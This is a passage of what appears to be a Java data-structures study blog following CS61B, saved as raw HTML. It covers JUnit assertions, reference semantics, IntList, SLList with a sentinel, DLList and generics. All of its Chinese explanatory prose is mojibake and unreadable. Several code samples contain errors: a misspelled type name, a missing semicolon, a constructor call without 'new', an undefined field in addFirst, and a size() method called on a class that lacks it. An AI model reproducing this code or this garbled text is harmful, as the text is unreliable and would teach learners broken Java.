&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ç§è¿‘ä¹æœ€åŸå§‹çš„æµ‹è¯•æ–¹å¼ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥æœ‰æ•ˆçš„æµ‹è¯•æˆ‘ä»¬ä»£ç çš„å¯è¡Œæ€§ã€‚</p><h2 id="JUnit-Testing"><a href="#JUnit-Testing" class="headerlink" title="JUnit Testing"></a>JUnit Testing</h2><p>org.junit åº“æä¾›äº†è®¸å¤šæœ‰ç”¨çš„æ–¹æ³•å’Œæœ‰ç”¨çš„åŠŸèƒ½æ¥ç®€åŒ–æµ‹è¯•çš„ç¼–å†™ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸Šé¢çš„ç®€å•ä¸´æ—¶æµ‹è¯•æ›¿æ¢ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSort</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span>[] input = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>&#125;;<br>    <span class="hljs-type">int</span>[] expected = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>&#125;;<br>    Sort.sort(input);<br>    org.junit.Assert.assertArrayEquals(expected, input);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ–¹æ³•æµ‹è¯• expected å’Œ actual æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™ç»ˆæ­¢ç¨‹åºå¹¶æ˜¾ç¤ºè¯¦ç»†é”™è¯¯æ¶ˆæ¯ã€‚</p><h1 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h1><h2 id="The-Mystery-of-the-Walrus"><a href="#The-Mystery-of-the-Walrus" class="headerlink" title="The Mystery of the Walrus"></a>The Mystery of the Walrus</h2><p>ç°åœ¨æœ‰ä¸¤æ®µä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Walrus</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Walrus</span>(<span class="hljs-number">1000</span>, <span class="hljs-number">8.3</span>);<br>Walrus b;<br>b = a;<br>b.weight = <span class="hljs-number">5</span>;<br>System.out.println(a);<br>System.out.println(b);<br><br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> y;<br>y = x;<br>x = <span class="hljs-number">2</span>;<br>System.out.println(<span class="hljs-string">&quot;x is: &quot;</span> + x);<br>System.out.println(<span class="hljs-string">&quot;y is: &quot;</span> + y);<br></code></pre></td></tr></table></figure><p>å¯¹äºç¬¬ä¸€æ®µä»£ç ï¼Œæˆ‘ä»¬è¾“å‡ºç»“æœèƒ½å¤Ÿå‘ç°aä¸bæŒ‡å‘äº†åŒä¸€ä¸ªå¯¹è±¡ï¼Œè€Œåœ¨ç¬¬äºŒæ®µä»£ç ä¸­ï¼Œxå’Œyå´æ˜¯ä¸åŒçš„æ•°å€¼ã€‚</p><p>åœ¨javaä¸­ï¼Œå£°æ˜å˜é‡ï¼ˆåŸºç¡€ç±»å‹çš„8ç§ï¼‰å¹¶ä¸ä¼šè¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>è¿™å°±æ„å‘³ç€ï¼Œå¦‚æœæœ‰è¿™æ ·ä¸€è¡Œä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> x;<br></code></pre></td></tr></table></figure><p>å¦‚æœä¸å¯¹xè¿›è¡Œèµ‹å€¼ï¼Œæˆ‘ä»¬å°†æ— æ³•ä½¿ç”¨å˜é‡xï¼Œå³æœªå®Œæˆå®ä¾‹åŒ–ã€‚</p><p>é™¤å¼€åŸºç¡€ç±»å‹ä»¥å¤–ï¼Œå…¶ä»–çš„æ‰€æœ‰å†…å®¹ï¼ˆåŒ…æ‹¬æ•°ç»„ï¼‰éƒ½ä¸æ˜¯åŸå§‹ç±»å‹ï¼Œè€Œæ˜¯reference typeã€‚</p><p>å½“æˆ‘ä»¬å£°æ˜ä»»ä½•å¼•ç”¨ç±»å‹æ—¶ï¼ŒJavaéƒ½ä¼šåˆ†é…ä¸€ä¸ª64bitsçš„ç©ºé—´ï¼Œæ— è®ºå¯¹è±¡æ˜¯ä»€ä¹ˆç±»å‹ã€‚</p><p>å…³é”®å­—newä¼šå°†åˆ›å»ºå‡ºçš„å¯¹è±¡å®ä¾‹çš„<strong>åœ°å€</strong>ä¼ ç»™å·¦ä¾§å£°æ˜çš„å¯¹è±¡ã€‚</p><p>èµ‹å€¼ç¬¦å· â€œ&#x3D;â€  è¡¨ç¤ºå°†å³ä¾§å˜é‡çš„bitsä¼ ç»™å·¦ä¾§å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Dog</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-number">10</span>);<br><span class="hljs-type">Dog</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œè¡¨ç¤ºå£°æ˜ä¸€ä¸ªDogå˜é‡aï¼Œåˆ›å»ºä¸€ä¸ªâ€œ10â€çš„Dogå®ä¾‹å¹¶å°†å…¶çš„åœ°å€ä¼ é€’ç»™aï¼Œæ‰€ä»¥ç¬¬äºŒè¡Œè¡¨ç¤ºå°†æ­¤å®ä¾‹çš„åœ°å€åŒæ ·çš„æ‹·è´ä¼ é€’ç»™bï¼Œå› æ­¤aå’Œbå®é™…ä¸ŠæŒ‡å‘åŒä¸€å®ä¾‹ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºåŸºç¡€ç±»å‹ï¼ŒJavaé‡‡ç”¨å€¼ä¼ é€’çš„æ–¹å¼ï¼›è€Œå¯¹äºå¼•ç”¨ç±»å‹ï¼ˆreference typeï¼‰ï¼ŒJavaé‡‡ç”¨å¼•ç”¨ä¼ é€’çš„ç±»å‹ï¼Œè¿™å¯¼è‡´ä¼ é€’ä¹‹åä¸¤ä¸ªå˜é‡å®é™…ä¸ŠæŒ‡å‘åŒä¸€ä¸ªåœ°å€ã€‚</p><p>å¦‚ä¸Šæ‰€è¿°ï¼Œå‚¨å­˜æ•°ç»„çš„å˜é‡ä¹Ÿæ˜¯ä¸€ç§å¼•ç”¨ç±»å‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] x;<br>x = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br>x = <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œå£°æ˜äº†ä¸€ä¸ªintç±»å‹çš„æ•°ç»„xï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´xå†…éƒ¨ä¸ºnullã€‚ç¬¬äºŒè¡Œåˆ™æ˜¯åˆ›å»ºäº†ä¸€ä¸ªå®ä¾‹å¹¶å°†å…¶ç»‘å®šåˆ°æ•°ç»„xä¸Šï¼Œä½†æ˜¯å½“ç¬¬ä¸‰è¡Œæ‰§è¡Œå®Œæ¯•åï¼Œæˆ‘ä»¬å°†æ°¸è¿œä¸¢å¤±æ•°ç»„{1, 2, 3}ã€‚</p><h2 id="First-taste-of-IntLists"><a href="#First-taste-of-IntLists" class="headerlink" title="First taste of IntLists"></a>First taste of IntLists</h2><p>æˆ‘ä»¬å¯ä»¥å°è¯•æ„å»ºä¸€ä¸ªè‡ªå·±çš„inté“¾è¡¨ï¼ŒåŒ…æ‹¬è·å–å¤§å°ã€è·å–æ•°æ®æ–¹æ³•çš„å®ç°ï¼ˆæˆ‘æœ€å–œæ¬¢recursionäº†ï¼Œæˆ‘çˆ±è¯´å®è¯ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntList</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> first;<br>    <span class="hljs-keyword">public</span> Intlist rest;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IntList</span><span class="hljs-params">(<span class="hljs-type">int</span> f, IntList r)</span> &#123;<br>        first = f;<br>        rest = r;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span>(rest == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + <span class="hljs-built_in">this</span>.rest.size()<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> first;<br>        &#125;<br>        <span class="hljs-keyword">return</span> rest.get(i-<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-SLList"><a href="#The-SLList" class="headerlink" title="The SLList"></a>The SLList</h2><p>åœ¨ä¸Šé¢çš„é“¾è¡¨å®ç°ä¸­ï¼Œç”¨æˆ·å¯ä»¥ç›´æ¥çœ‹åˆ°å†…éƒ¨çš„æ•°æ®ç»“æ„ï¼Œè¿™ç§ <em>naked</em> çš„æ•ˆæœæ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æ‰€æœŸå¾…çš„ã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬å°†é“¾è¡¨å†æ¬¡åŒ…è£…ä¸€å±‚ï¼Œé¿å…è£¸éœ²çš„æ•°æ®ç»“æ„ï¼Œå½¢æˆåµŒå¥—ç»“æ„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntNode</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> item;<br>    <span class="hljs-keyword">public</span> IntNode next;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IntNode</span><span class="hljs-params">(<span class="hljs-type">int</span> i, IntNode n)</span> &#123;<br>        item = i;<br>        next = n;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸º <em>SLList</em> çš„å•ç‹¬ç±»ï¼Œç”¨æˆ·å°†ä¸ä¹‹äº¤äº’ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SLList</span> &#123;<br>    <span class="hljs-keyword">public</span> IntNode first;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SLList</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        first = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntNode</span>(x, <span class="hljs-literal">null</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ä¸€äº›åŸºç¡€æ–¹æ³•çš„å®ç°ï¼ŒåŒ…æ‹¬ï¼šaddFirst, getFirst, addLast, size</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SLList</span> &#123;<br>    <span class="hljs-keyword">private</span> IntNode first;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SLList</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        first = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntNode</span>(x, <span class="hljs-literal">null</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFirst</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        first = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntNode</span>(x, first);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> first.item;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addLast</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        <span class="hljs-type">IntNode</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> first;<br>        <span class="hljs-keyword">while</span>(p.next != <span class="hljs-literal">null</span>) &#123;<br>            p = p.next;<br>        &#125;<br>        p.next = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntNode</span>(x, <span class="hljs-literal">null</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">IntNode</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> first;<br>        <span class="hljs-keyword">if</span>(p.next == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        p = p.next;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + p.size();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´è§‚æ¯”è¾ƒä¸¤ä¸ªæ•°æ®ç»“æ„çš„åŒºåˆ«ï¼š</p><p><img src="/Pictures/CS61b/02/IntList_vs_SLList.png" alt="img"></p><p>æœ¬è´¨ä¸Šï¼ŒSLList ç±»å……å½“åˆ—è¡¨ç”¨æˆ·å’Œè£¸é€’å½’æ•°æ®ç»“æ„ä¹‹é—´çš„ä¸­é—´äººã€‚æ­£å¦‚ä¸Šé¢åœ¨ IntList ç‰ˆæœ¬ä¸­æ‰€å»ºè®®çš„ï¼ŒIntList ç”¨æˆ·å¯èƒ½æ‹¥æœ‰æŒ‡å‘ IntList ä¸­é—´çš„å˜é‡ã€‚è¿›ä¸€æ­¥ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†å±æ€§æ”¹ä¸º<em>private</em>ã€‚</p><h3 id="Nested-Classes"><a href="#Nested-Classes" class="headerlink" title="Nested Classes"></a>Nested Classes</h3><p>å¯¹äºSLListè€Œè¨€ï¼ŒIntNodeæ˜¯å…¶ä¸­çš„åµŒå¥—ç±»ã€‚</p><p>è¿™ç§åµŒå¥—å…³ç³»æˆ‘ä»¬ä¸€èˆ¬ç§°ä¹‹ä¸º <em>â€œhas-aâ€</em> å…³ç³»ã€‚</p><p>å¦‚æœåµŒå¥—ç±»ä¸éœ€è¦ä½¿ç”¨SLListçš„ä»»ä½•å®ä¾‹æ–¹æ³•æˆ–å˜é‡ï¼Œåˆ™å¯ä»¥å£°æ˜ä¸º <em>static</em> ï¼Œè¿™æ„å‘³ç€é™æ€ç±»ä¸­çš„æ–¹æ³•æ— æ³•è®¿é—®å°é—­ç±»çš„ä»»ä½•æˆå‘˜ï¼ŒèŠ‚çœå†…å­˜ã€‚</p><h3 id="Improvement"><a href="#Improvement" class="headerlink" title="Improvement"></a>Improvement</h3><p>å¯¹ <em>size()</em> æ–¹æ³•è¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°æ—¶é—´å¤æ‚åº¦ä¸º <em>O(n)</em> ã€‚å¯¹äºè¾ƒå¤§çš„åˆ—è¡¨æ¥è¯´ï¼Œæ—¶é—´è¾ƒé•¿ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç›´æ¥æ·»åŠ ä¸€ä¸ªå˜é‡æ¥è·Ÿè¸ªå½“å‰é“¾è¡¨çš„é•¿åº¦ï¼Œè¿™æ ·æ—¶é—´å¤æ‚åº¦å˜ä¸ºäº† *O(1)*ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">SLList</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    ...<br>    size = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFirst</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    ...<br>    size += <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addLast</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    ...<br>    size += <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œæˆ‘ä»¬å‘ç°åˆå§‹åˆ›å»ºç©ºé“¾è¡¨æ—¶ï¼Œå¯¹å…¶è¿›è¡ŒaddLastæ–¹æ³•ä¼šå¯¼è‡´é”™è¯¯ï¼Œè¿™æ˜¯å› ä¸º first æ˜¯ null ï¼Œå› æ­¤å°è¯•è®¿é—®ä¸‹é¢ while (p.next !&#x3D; null) ä¸­çš„ p.next ä¼šå¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</p><p>æˆ‘ä»¬è€ƒè™‘åŠ å…¥ä¸å˜çš„å¤´èŠ‚ç‚¹(head)ï¼Œåœ¨æ­¤è¯¾ç¨‹ä¸­ç§°ä¸º <em>Sentinel Node</em> ã€‚</p><p>é‡æ„ä¹‹åçš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SLList</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size;<br>    <span class="hljs-keyword">private</span> IntNode sentinel;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SLList</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        sentinel = IntNode(<span class="hljs-number">10</span>, <span class="hljs-literal">null</span>);<br>        sentinel.next = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntNode</span>(x, <span class="hljs-literal">null</span>);<br>        size = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SLList</span><span class="hljs-params">()</span> &#123;<br>        sentinel = IntNode(<span class="hljs-number">10</span>, <span class="hljs-literal">null</span>);<br>        size = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFirst</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        sentinel.next = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntNode</span>(x, first);<br>        size += <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> sentinel.next.item;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addLast</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        <span class="hljs-type">IntNode</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> sentinel.next;<br>        <span class="hljs-keyword">while</span>(p.next != <span class="hljs-literal">null</span>) &#123;<br>            p = p.next;<br>        &#125;<br>        p.next = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntNode</span>(x, <span class="hljs-literal">null</span>);<br>        size += <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> size;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-DLList"><a href="#The-DLList" class="headerlink" title="The DLList"></a>The DLList</h2><p>å¯¹äºSLListæ¥è¯´ï¼Œå‘å‰æœç´¢æ˜¯ååˆ†å›°éš¾çš„ï¼Œå½“æˆ‘ä»¬æƒ³è·å–æœ€åä¸€ä¸ªèŠ‚ç‚¹æ—¶ï¼Œä¸å¯é¿å…çš„éœ€è¦éå†æ•´ä¸ªé“¾è¡¨ã€‚</p><p>å› æ­¤æˆ‘ä»¬è€ƒè™‘æ„é€ åŒå‘é“¾è¡¨ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¿å­˜äº†å‰ä¸€ä¸ªèŠ‚ç‚¹å’Œåä¸€ä¸ªèŠ‚ç‚¹çš„ä¿¡æ¯ã€‚</p><p>ä¸»è¦æœ‰ä¸¤ç§å®ç°æ–¹å¼ï¼šå¾ªç¯é“¾è¡¨(å•ä¸ªsentinel)å’ŒåŒå‘é“¾è¡¨(åŒsentinel)ã€‚</p><p><img src="/Pictures/CS61b/02/dllist_circular_sentinel_size_2.png" alt="img"></p><p><img src="/Pictures/CS61b/02/dllist_double_sentinel_size_2.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DLList</span> &#123;<br>    <span class="hljs-keyword">private</span> IntNode sentinel;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntNode</span> &#123;<br>        <span class="hljs-keyword">public</span> IntNode prev;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> item;<br>        <span class="hljs-keyword">public</span> IntNode next;<br>        ...<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="First-try-of-Generic-Model"><a href="#First-try-of-Generic-Model" class="headerlink" title="First try of Generic Model"></a>First try of Generic Model</h3><p>åœ¨Javaä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ³›å‹ç¼–ç¨‹æ¥å®ç°å¯¹ä¸åŒæ•°æ®ç±»å‹æ•°æ®çš„å­˜å‚¨ã€‚</p><p>åŸºæœ¬è¯­æ³•æ˜¯ï¼šåœ¨ç±»å£°æ˜ä¸­çš„ç±»åä¹‹åï¼Œåœ¨å°–æ‹¬å·å†…ä½¿ç”¨ä»»æ„å ä½ç¬¦ &lt;&gt; ,ç„¶ååœ¨ä»»ä½•ä½¿ç”¨ä»»æ„ç±»å‹çš„åœ°æ–¹éƒ½ä½¿ç”¨è¯¥å ä½ç¬¦ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DLList</span>&lt;TypeName&gt; &#123;<br>    <span class="hljs-keyword">private</span> IntNode sentinel;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntNode</span> &#123;<br>        <span class="hljs-keyword">public</span> IntNode prev;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> item;<br>        <span class="hljs-keyword">public</span> IntNode next;<br>        ...<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å®ä¾‹åŒ–æ—¶ï¼Œéœ€è¦æŒ‡æ˜ç±»å‹åã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">DLList&lt;String&gt; d2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DLList</span>&lt;&gt;(<span class="hljs-string">&quot;hello&quot;</span>);<br>d2.addLast(<span class="hljs-string">&quot;world&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="Arrays"><a href="#Arrays" class="headerlink" 